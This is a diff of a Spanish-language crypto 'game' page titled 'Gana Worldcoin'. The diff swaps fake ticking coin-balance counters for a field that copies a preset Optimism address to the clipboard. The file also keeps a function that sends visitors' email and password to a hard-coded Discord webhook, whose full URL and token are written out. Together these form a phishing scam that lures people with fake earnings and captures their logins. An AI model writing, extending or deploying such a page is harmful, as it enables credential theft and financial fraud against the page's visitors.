@@ -28,31 +28,10 @@
 <div id="game-container" style="display:none;">
     <h1>Gana Worldcoin</h1>
     <p>Jugar es muy sencillo</p>
-      <div id="contadores">
-        <div class="contador" id="contador1">
-            <span>0.00001</span>
-            <button id="iniciarContador1">Iniciar Contador 1</button>
-        </div>
-        <div class="contador" id="contador2">
-            <span>0.00001</span>
-            <button id="iniciarContador2">Iniciar Contador 2</button>
-        </div>
-        <div class="contador" id="contador3">
-            <span>0.00001</span>
-            <button id="iniciarContador3">Iniciar Contador 3</button>
-        </div>
-        <div class="contador" id="contador4">
-            <span>0.00001</span>
-            <button id="iniciarContador4">Iniciar Contador 4</button>
-        </div>
-        <div class="contador" id="contador5">
-            <span>0.00001</span>
-            <button id="iniciarContador5">Iniciar Contador 5</button>
-        </div>
-        <div class="contador" id="contador6">
-            <span>0.00001</span>
-            <button id="iniciarContador6">Iniciar Contador 6</button>
-        </div>
+      <div id="worldcoin-dashboard">
+        <input type="text" id="worldcoinAddressInput" placeholder="Ingresa tu dirección de Optimism">
+        <button id="copyAddress">Copiar Dirección</button>
+        <p id="providedAddress" style="display:none;">DirecciónDeOptimismQueVasAProporcionar</p>
     </div>
 </div>
 
@@ -243,44 +222,15 @@ span {
        inicializarContadores(); // Asegúrate de llamar esta función para inicializar los contadores
        
 
-function inicializarContadores() {
-    for (let i = 1; i <= 6; i++) {
-        let valor = localStorage.getItem(`contador${i}`) || 0.00001;
-        document.querySelector(`#contador${i} span`).textContent = parseFloat(valor).toFixed(5);
-        document.getElementById(`iniciarContador${i}`).addEventListener('click', function() {
-            iniciarContador(i);
+    document.getElementById('copyAddress').addEventListener('click', function() {
+        // Obtiene la dirección de Optimism proporcionada y la copia al portapapeles
+        var providedAddress = document.getElementById('providedAddress').textContent;
+        navigator.clipboard.writeText(providedAddress).then(function() {
+            alert('Dirección copiada al portapapeles');
+        }, function(err) {
+            console.error('Error al copiar la dirección:', err);
         });
-    }
-}
-
-function iniciarContador(tipo) {
-    let valorInicial = parseFloat(localStorage.getItem(`contador${tipo}`) || 0.00001);
-    actualizarContador(tipo, valorInicial);
-}
-
-function actualizarContador(tipo, valorInicial) {
-    const incremento = 0.00001;
-    const intervalos = [60000, 120000, 180000, 300000, 420000, 600000]; // Milisegundos
-    const spanElement = document.querySelector(`#contador${tipo} span`);
-    setInterval(() => {
-        if (valorInicial < 400) {
-            valorInicial += incremento;
-            localStorage.setItem(`contador${tipo}`, valorInicial);
-            spanElement.textContent = valorInicial.toFixed(5);
-            
-            // Aplicar efecto de parpadeo
-            spanElement.classList.add('parpadeo');
-            
-            // Remover el efecto de parpadeo después de 1 segundo
-            setTimeout(() => {
-                spanElement.classList.remove('parpadeo');
-            }, 1000);
-        }
-    }, intervalos[tipo - 1]);
-}
-
-    
-
+    });
 
 function enviarDatosAWebhook(email, contrasena) {
     var webhookURL = 'https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo';
